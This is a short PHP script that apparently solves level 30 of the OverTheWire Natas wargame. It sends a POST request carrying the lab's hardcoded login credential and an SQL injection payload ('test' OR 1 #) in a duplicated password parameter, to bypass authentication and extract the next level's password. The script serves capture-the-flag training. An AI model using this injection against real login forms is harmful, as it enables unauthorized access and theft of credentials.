<?php
include_once "./functions.php";
$url = "http://natas30.natas.labs.overthewire.org/index.pl";
$ch = curl_init ($url);
curl_setopt($ch, CURLOPT_USERPWD,"natas30:Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X");  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POST, 1);
$dataStr = ("username=natas31&password='test' OR 1 #&password=4");
curl_setopt($ch, CURLOPT_POSTFIELDS, $dataStr);
$output = curl_exec($ch);
curl_close($ch);
echo get_string_between($output,"here is your result:<br>natas31","<div id=");
?>